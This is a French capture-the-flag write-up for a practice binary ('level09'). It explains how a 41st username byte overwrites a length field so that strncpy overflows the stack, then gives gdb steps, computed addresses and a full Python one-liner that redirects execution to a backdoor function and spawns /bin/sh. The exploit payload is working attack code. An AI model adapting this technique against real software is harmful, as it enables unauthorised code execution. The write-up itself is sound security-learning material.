## Level 09

### Analyse

Le binaire contient une fonction `secret_backdoor()` qui lit une entrée et la passe directement à `system()`.
Le `main` appelle `handle_msg()` qui appelle `set_username()` puis `set_msg()`.

**Vulnérabilité dans `set_username`** : la boucle itère 40 fois et copie l'username dans le struct à partir de l'offset `+0x8c`. Le 41ème byte écrase le champ `len_msg` situé à l'offset `+0xb4` (`0xb4 - 0x8c = 0x28 = 40`).

**Vulnérabilité dans `set_msg`** : `strncpy` utilise `len_msg` comme taille de copie. En écrasant ce champ avec `\xff` (255), on force `strncpy` à copier bien plus que prévu → stack buffer overflow → contrôle du return address.

**Objectif** : écraser le return address de `handle_msg` avec l'adresse de `secret_backdoor`, puis envoyer `/bin/sh` comme commande.

---

**Trouver l'adresse de `secret_backdoor`** :
```bash
gdb ./level09
info functions
# → les adresses affichées sont relatives (PIE actif)

break handle_msg
run
p secret_backdoor
```

**Trouver la taille de la stack et les adresses réelles** :
```bash
disass handle_msg
# → sub $0xc0,%rsp  (192 bytes alloués)

info frame
# → rbp = 0x7fffffffe5c0
# → return address = 0x7fffffffe5c8

p/x $rbp - 0xc0
# → buffer = 0x7fffffffe500
```

**Calculer le padding** :
```
return_addr - buffer = 0x7fffffffe5c8 - 0x7fffffffe500 = 0xc8 = 200 bytes
```

---

### Valeurs

| Élément              | Valeur                              |
|----------------------|-------------------------------------|
| `secret_backdoor`    | `0x55555555488c`                    |
| Buffer               | `0x7fffffffe500`                    |
| Return address       | `0x7fffffffe5c8`                    |
| Padding nécessaire   | `200 bytes`                         |
| Écrasement `len_msg` | `\xff` (41ème byte de l'username)   |

---

### Exploitation

```bash
(python -c '
print("A" * 40 + "\xff"
+ "\n"
+ "A" * 200
+ "\x8c\x48\x55\x55\x55\x55\x00\x00"
+ "\n"
+ "/bin/sh")
'; cat) | ./level09
```

| Partie                              | Rôle                                          |
|-------------------------------------|-----------------------------------------------|
| `"A" * 40 + "\xff"`                 | Écrase `len_msg` avec 255                     |
| `"A" * 200`                         | Padding jusqu'au return address               |
| `\x8c\x48\x55\x55\x55\x55\x00\x00`  | Adresse de `secret_backdoor` (little-endian)  |
| `/bin/sh`                           | Commande passée à `system()`                  |
